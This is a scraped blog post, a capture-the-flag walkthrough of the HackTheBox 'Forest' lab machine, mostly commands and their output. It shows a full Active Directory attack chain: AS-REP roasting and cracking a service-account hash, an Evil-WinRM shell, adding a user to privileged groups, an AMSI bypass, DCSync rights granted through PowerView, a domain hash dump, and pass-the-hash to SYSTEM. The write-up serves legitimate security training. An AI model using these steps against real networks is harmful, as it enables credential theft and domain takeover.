href="https://qtranspose.xyz/posts/htb-forest/" /><meta property="og:url" content="https://qtranspose.xyz/posts/htb-forest/" /><meta property="og:site_name" content="QTranspose" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-02-23T00:00:00+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB - Forest" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@QTranspose" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Forest is a vulnerable virtual machine created by egre55 and mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we see that this is a Windows machine with all sorts of Active Directory ports open. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 $ nmap-default 10.10.10.161 Nmap scan report for 10.10.10.161 Host is up (0.11s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-02-21 08:29:35Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h45m15s, deviation: 4h37m09s, median: 5m14s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2021-02-21T00:29:44-08:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-02-21T08:29:45 |_ start_date: 2021-02-21T07:57:08 We then perform an nmap-full scan, by which a few more ports are discovered. In the results, we notice that the port 5985 is open which is WinRM. The service can be convenient for us to get a shell when we have valid credentials. 1 2 3 4 5 6 7 $ nmap-full 10.10.10.161 ... 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found For the details of the custom nmap commands, check here. LDAP We can perform “null base” and “null bind” searches to let the server leak some information to us. Query available base DNs from root DSE: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ ldapsearch -h 10.10.10.161 -x -s base namingcontexts # extended LDIF # # LDAPv3 # base &lt;&gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingContexts: DC=htb,DC=local namingContexts: CN=Configuration,DC=htb,DC=local namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local namingContexts: DC=DomainDnsZones,DC=htb,DC=local namingContexts: DC=ForestDnsZones,DC=htb,DC=local # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 Query potential usernames: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 $ ldapsearch -h 10.10.10.161 -x -b &quot;DC=htb,DC=local&quot; &quot;(objectClass=Person)&quot; sAMAccountName | grep sAMAccountName # requesting: sAMAccountName sAMAccountName: Guest sAMAccountName: DefaultAccount sAMAccountName: FOREST$ sAMAccountName: EXCH01$ sAMAccountName: $331000-VK4ADACQNUCA sAMAccountName: SM_2c8eef0a09b545acb sAMAccountName: SM_ca8c2ed5bdab4dc9b sAMAccountName: SM_75a538d3025e4db9a sAMAccountName: SM_681f53d4942840e18 sAMAccountName: SM_1b41c9286325456bb sAMAccountName: SM_9b69f1b9d2cc45549 sAMAccountName: SM_7c96b981967141ebb sAMAccountName: SM_c75ee099d0a64c91b sAMAccountName: SM_1ffab36a2f5f479cb sAMAccountName: HealthMailboxc3d7722 sAMAccountName: HealthMailboxfc9daad sAMAccountName: HealthMailboxc0a90c9 sAMAccountName: HealthMailbox670628e sAMAccountName: HealthMailbox968e74d sAMAccountName: HealthMailbox6ded678 sAMAccountName: HealthMailbox83d6781 sAMAccountName: HealthMailboxfd87238 sAMAccountName: HealthMailboxb01ac64 sAMAccountName: HealthMailbox7108a4e sAMAccountName: HealthMailbox0659cc1 sAMAccountName: sebastien sAMAccountName: lucinda sAMAccountName: andy sAMAccountName: mark sAMAccountName: santi Readings: https://www.tenable.com/plugins/nessus/10722 https://www.tenable.com/plugins/nessus/10723 https://tools.ietf.org/html/rfc4513#section-5.1.1 DNS Play with the DNS: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 $ host htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: htb.local has address 10.10.10.161 $ host -t ns htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: htb.local name server forest.htb.local. $ host forest.htb.local 10.10.10.161 Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: forest.htb.local has address 10.10.10.161 Try zone transfer failed: 1 2 3 4 5 6 7 8 9 $ host -t axfr htb.local 10.10.10.161 Trying &quot;htb.local&quot; Using domain server: Name: 10.10.10.161 Address: 10.10.10.161#53 Aliases: Host htb.local not found: 5(REFUSED) ; Transfer failed. SMB Try listing shares with null session authentication failed: 1 2 3 $ crackmapexec smb 10.10.10.161 -u &#39;&#39; -p &#39;&#39; --shares SMB 10.10.10.161 445 FOREST [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) SMB 10.10.10.161 445 FOREST [-] htb.local\\: STATUS_ACCESS_DENIED RPC Enumerate domain users with rpcclient: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 $ rpcclient -U &#39;&#39; -N 10.10.10.161 rpcclient $&gt; enum enumalsgroups enumdomains enumdrivers enumkey enumports enumprocdatatypes enumdata enumdomgroups enumforms enummonitors enumprinters enumprocs enumdataex enumdomusers enumjobs enumpermachineconnections enumprivs enumtrust rpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Note that the results are slightly different from what we get from LDAP previously. Exploitation AS-REP Roasting AS-REP roasting is an attack that allows retrieving password hashes for users that do not require Kerberos preauthentication. For more details, refer to here. Get a list of users with UF_DONT_REQUIRE_PREAUTH set: 1 2 3 4 5 6 $ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation Name MemberOf PasswordLastSet LastLogon UAC ------------ ------------------------------------------------------ -------------------------- -------------------------- -------- svc-alfresco CN=Service Accounts,OU=Security Groups,DC=htb,DC=local 2021-02-21 05:15:28.644990 2021-02-21 04:34:44.843064 0x410200 Get a TGT for svc-alfresco: 1 2 3 4 5 $ impacket-GetNPUsers -dc-ip 10.10.10.161 htb.local/svc-alfresco -no-pass Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:d2cb9ef633c35eb1025358d77a74d1b8$05cf5d6351281f527192489ce06d152359abd444ad19d6d1aae9790ccf3d602ca00fbf4cc01117f10ccf4ccdd8544f3d32dbe95d9fe3c1503ff1c8a2ce685a37d006db803d7c705dd81207c5e7fed044fbbdbc971b3ce7e4d349b3e1a1bb13de05890337afb73c4faa4ad95cd59ba8ed755a722f4620e093d98ed33d3b34c0c67df0332cadadaa2f9be567bdede1adfe4c96ffbc18b4a96fc3d9f7a3d6f84ec34294916d1fa236350c49c836efb74be3c2720afcb2c2c56ae88c4eab298e5b6f39b5c841141e1de728895a9d32faecddf52694de2c0bb912dbb124e4b4ab0126fed452a2ea7e After copying the hash to a file named hash, we can try to crack it with john. 1 2 3 4 5 $ john -w=/opt/rockyou.txt hash ... s3rvice ($krb5asrep$23$svc-alfresco@HTB.LOCAL) The crack is successful with the wordlist rockyou.txt and we get the password s3rvice for the account svc-alfresco. With the credentials, we get a shell via Evil-WinRM. 1 2 3 4 5 6 7 8 $ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -n Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; whoami htb\\svc-alfresco Privilege Escalation To enumerate the domain and find PE vectors, we will use BloodHound. First, we use the python based ingestor to collect information. 1 $ bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c all By doing this, we get a few json files. Next, we drop these files into BloodHound. After the data is processed, we query “Shortest Path from Owned Principals”, and “Shortest Paths to High Value Targets” respectively. From the first query we we can see that svc-alfresco, which is already owned by us, is eventually a member of “Account Operators”. This means that we can create users and add them to normal groups. Combining it with the second query, we find a PE path as the following: This PE vector contais two main steps. In the first step, we will create an user and add it to the “Exchange Windows Permissions” group. We are able to do this because we are a member of the “Account Operators” group. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net user qt Password123! /add /domain The command completed successfully. *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net group &quot;Exchange Windows Permissions&quot; qt /add The command completed successfully. *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net group &quot;Exchange Windows Permissions&quot; Group name Exchange Windows Permissions Comment This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted. Members ------------------------------------------------------------------------------- qt The command completed successfully. We also add this account to the “Remote Management Users” group so that we can login with Evil-WinRM. 1 2 3 4 5 6 7 8 9 10 11 12 13 *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net localgroup &quot;Remote Management Users&quot; qt /add The command completed successfully. *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net localgroup &quot;Remote Management Users&quot; Alias name Remote Management Users Comment Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. Members ------------------------------------------------------------------------------- Privileged IT Accounts qt The command completed successfully. In the second step, we will use Add-ObjectACL from PowerView.ps1 to grant us DCSync Privileges. We are able to do this because we are now in the “Exchange Windows Permissions” group. More details of this attack can be found here. Note that Bypass-4MSI is needed before loading PowerView.ps1. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ evil-winrm -i 10.10.10.161 -u qt -p Password123! -n -s $(pwd) Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\qt\\Documents&gt; menu ,. ( . ) &quot; ,. ( . ) . (&quot; ( ) )&#39; ,&#39; (` &#39;` (&quot; ) )&#39; ,&#39; . ,) .; ) &#39; (( (&quot; ) ;(, . ;) &quot; )&quot; .; ) &#39; (( (&quot; ) );(, )(( _&quot;.,_,.__).,) (.._( ._), ) , (._..( &#39;.._&quot;._, . &#39;._)_(..,_(_&quot;.) _( _&#39;) \\_ _____/__ _|__| | (( ( / \\ / \\__| ____\\______ \\ / \\ | __)_\\ \\/ / | | ;_)_&#39;) \\ \\/\\/ / |/ \\| _/ / \\ / \\ | \\\\ /| | |__ /_____/ \\ /| | | \\ | \\/ Y \\ /_______ / \\_/ |__|____/ \\__/\\ / |__|___| /____|_ /\\____|__ / \\/ \\/ \\/ \\/ \\/ By: CyberVaca, OscarAkaElvis, Laox @Hackplayers [+] Bypass-4MSI [+] Dll-Loader [+] Donut-Loader [+] Invoke-Binary *Evil-WinRM* PS C:\\Users\\qt\\Documents&gt; Bypass-4MSI [+] Patched! :D *Evil-WinRM* PS C:\\Users\\qt\\Documents&gt; PowerView.ps1 *Evil-WinRM* PS C:\\Users\\qt\\Documents&gt; $pass = convertto-securestring &#39;Password123!&#39; -asplain -force *Evil-WinRM* PS C:\\Users\\qt\\Documents&gt; $cred = new-object system.management.automation.pscredential(&#39;HTB\\qt&#39;, $pass) *Evil-WinRM* PS C:\\Users\\qt\\Documents&gt; add-objectacl -principalidentity qt -credential $cred -rights DCSync Now that we have DCSync privileges, we can use impacket-secretsdump to dump NTLM hashes of all domain users. 1 2 3 4 5 6 7 8 9 10 11 $ impacket-secretsdump htb.local/qt@10.10.10.161 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation Password: [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: ... With the hash of Administrator, we can pass-the-hash via psexec and get an escalated shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 $ impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.161..... [*] Found writable share ADMIN$ [*] Uploading file StbHukQA.exe [*] Opening SVCManager on 10.10.10.161..... [*] Creating service GpKO on 10.10.10.161..... [*] Starting service GpKO..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami nt authority\\system","@type":"BlogPosting","headline":"HTB - Forest","dateModified":"2021-03-07T13:07:33+11:00","datePublished":"2021-02-23T00:00:00+11:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://qtranspose.xyz/posts/htb-forest/"},"author":{"@type":"Person","name":"QTranspose"},"url":"https://qtranspose.xyz/posts/htb-forest/","@context":"https://schema.org"}</script><title>HTB - Forest | QTranspose</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/qtranspose.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">QTranspose</a></div><div class="site-subtitle font-italic">Rock The Matrix</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/QTranspose" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://app.hackthebox.eu/profile/112476" aria-label="hackthebox" class="order-4" target="_blank" rel="noopener"> <i class="fas fa-cube"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HTB - Forest</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HTB - Forest</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Feb 23, 2021, 12:00 AM +1100" > Feb 23 <i class="unloaded">2021-02-23T00:00:00+11:00</i> </span> by <span class="author"> QTranspose </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Mar 7, 2021, 1:07 PM +1100" > Mar 7 <i class="unloaded">2021-03-07T13:07:33+11:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1859 words">10 min</span></div></div><div class="post-content"><p>Forest is a vulnerable virtual machine created by egre55 and mrb3n on HackTheBox. In this post, we document a complete walkthrough of pwning this machine.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap">Nmap</h3><p>Starting off with the <code class="language-plaintext highlighter-rouge">nmap</code> scan, we see that this is a Windows machine with all sorts of Active Directory ports open.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>$ nmap-default 10.10.10.161

Nmap scan report for 10.10.10.161
Host is up (0.11s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-02-21 08:29:35Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h45m15s, deviation: 4h37m09s, median: 5m14s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2021-02-21T00:29:44-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-02-21T08:29:45
|_  start_date: 2021-02-21T07:57:08
</pre></table></code></div></div><p>We then perform an <code class="language-plaintext highlighter-rouge">nmap-full</code> scan, by which a few more ports are discovered. In the results, we notice that the port <code class="language-plaintext highlighter-rouge">5985</code> is open which is <code class="language-plaintext highlighter-rouge">WinRM</code>. The service can be convenient for us to get a shell when we have valid credentials.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$ nmap-full 10.10.10.161

...

5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
</pre></table></code></div></div><p>For the details of the custom <code class="language-plaintext highlighter-rouge">nmap</code> commands, check <a href="/posts/workflow-improvement-with-simple-bash-scripts/">here</a>.</p><h3 id="ldap">LDAP</h3><p>We can perform “null base” and “null bind” searches to let the server leak some information to us.</p><p>Query available base DNs from <code class="language-plaintext highlighter-rouge">root DSE</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>$ ldapsearch -h 10.10.10.161 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base &lt;&gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
</pre></table></code></div></div><p>Query potential usernames:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>$ ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" "(objectClass=Person)" sAMAccountName | grep sAMAccountName
# requesting: sAMAccountName 
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
